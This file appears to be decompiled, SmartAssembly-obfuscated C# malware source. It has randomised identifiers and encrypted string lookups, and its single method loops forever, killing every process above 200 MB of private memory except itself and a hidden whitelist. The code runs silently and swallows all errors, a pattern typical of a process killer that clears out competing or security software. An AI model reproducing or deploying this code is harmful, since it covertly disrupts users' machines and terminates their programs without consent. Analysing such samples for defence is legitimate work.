using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace KXfHkplBSblOeZ;

public static class yxcHpdrQPlqshJa
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void ZurNMOMYmWzCS()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107401797)) && !process.ProcessName.Contains(getString_0(107401788)) && !process.ProcessName.Contains(getString_0(107401747)) && !process.ProcessName.Contains(getString_0(107401738)) && !process.ProcessName.Contains(getString_0(107401757)) && !process.ProcessName.Contains(getString_0(107401200)) && !process.ProcessName.Contains(getString_0(107401219)) && !process.ProcessName.Contains(getString_0(107401174)) && !process.ProcessName.Contains(getString_0(107401161)) && !process.ProcessName.Contains(getString_0(107401180)) && !process.ProcessName.Contains(getString_0(107401159)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static yxcHpdrQPlqshJa()
	{
		Strings.CreateGetStringDelegate(typeof(yxcHpdrQPlqshJa));
	}
}
